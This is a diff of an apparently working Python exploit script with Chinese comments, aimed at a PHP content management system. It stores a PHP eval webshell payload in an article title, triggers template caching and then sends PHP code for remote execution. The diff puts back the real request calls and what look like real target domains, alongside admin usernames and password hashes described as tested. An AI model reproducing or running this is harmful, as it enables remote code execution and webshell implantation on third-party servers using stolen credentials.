@@ -61,7 +61,7 @@ def exploit(ip, scheme, host, admin_user, admin_hash, payload="<php>@eval($_POST
     #    title 在渲染点 {$id5['title']|htmlspecialchars_decode} 会被 htmlspecialchars_decode 还原
     data = {"title": payload, "cid": "5102", "cont": "x", "cont1": "x", "stop": "0",
             "topublic": "1", "status": "1", "cyid": "0", "sort": "99999"}
-    r2 = target8.example.com(BASE + "/example.com?g=Home&m=Article&a=edit_cont",
+    r2 = S.post(BASE + "/example.com?g=Home&m=Article&a=edit_cont",
                 headers=dict(H, **{"Referer": BASE + "/"}), cookies=CK, data=data,
                 timeout=30, verify=False, allow_redirects=False, proxies=PX)
     print("[+] 写入 article.title ->", r2.text[:120])
@@ -73,14 +73,14 @@ def exploit(ip, scheme, host, admin_user, admin_hash, payload="<php>@eval($_POST
         print("[-] List 页未原样渲染 payload（检查渲染点是否带 |htmlspecialchars_decode）"); return None
     print("[+] List 页已原样渲染 payload")
 
-    # 3) 零凭证烘焙模板：抓取 http://vggc.<cfg_siteurl3>/List/index/type/0（*.target395.example.com 自指解析=抓自己）
+    # 3) 零凭证烘焙模板：抓取 http://vggc.<cfg_siteurl3>/List/index/type/0（*.abrdns.com 自指解析=抓自己）
     r3 = S.get(BASE + "/example.com?g=Home&m=Order&a=get_html1", headers=H, timeout=45,
                verify=False, allow_redirects=False, proxies=PX)
     print("[+] get_html1 ->", r3.text[:80])
 
     # 4) 用「第三者 Host」触发：Home/Index::index() 里
     #    Host 含 'sp' → display('indexapp')；含 'example' → display('indexalert')；否则 display() = 被覆盖的模板
-    r4 = target8.example.com(BASE + "/example.com", headers=dict(H, **{"Content-Type": "application/x-www-form-urlencoded"}),
+    r4 = S.post(BASE + "/example.com", headers=dict(H, **{"Content-Type": "application/x-www-form-urlencoded"}),
                 data={"1": "echo 'RCE_'.md5('ok').'_END';"}, timeout=45, verify=False,
                 allow_redirects=False, proxies=PX)
     return r4.text if "RCE_" in r4.text else None
@@ -88,11 +88,11 @@ def exploit(ip, scheme, host, admin_user, admin_hash, payload="<php>@eval($_POST
 if __name__ == "__main__":
     # 实测有效的跨节点凭据对（176 admin 表 → 78/84/131/7/160）
     JOBS = [
-        ("203.0.113.3",  "http", "target401.example.com", "the",   "e8a3d8da126fbe80564309f709a539f2"),
-        ("203.0.113.4",  "http", "target402.example.com",  "admin", "776bdea736fdc83d433a624dcb688656"),
-        ("203.0.113.114",  "http", "target403.example.com",   "admin", "776bdea736fdc83d433a624dcb688656"),
-        ("203.0.113.115",    "http", "target404.example.com",   "admin", "776bdea736fdc83d433a624dcb688656"),
-        ("203.0.113.99", "https","target405.example.com",   "admin", "776bdea736fdc83d433a624dcb688656"),
+        ("203.0.113.3",  "http", "thbac1dsua6v.fwjpnbbpq6.xyz", "the",   "e8a3d8da126fbe80564309f709a539f2"),
+        ("203.0.113.4",  "http", "dby1lue9xo.5848whqvguq.xyz",  "admin", "776bdea736fdc83d433a624dcb688656"),
+        ("203.0.113.114",  "http", "dbc1bflc8k.g6i73anzp4.xyz",   "admin", "776bdea736fdc83d433a624dcb688656"),
+        ("203.0.113.115",    "http", "dbc2bflc8k.g6i73anzp4.xyz",   "admin", "776bdea736fdc83d433a624dcb688656"),
+        ("203.0.113.99", "https","zsogv1w9lo.5q3z6ru9xk.xyz",   "admin", "776bdea736fdc83d433a624dcb688656"),
     ]
     for job in JOBS:
         print("=== %s ===" % job[0])
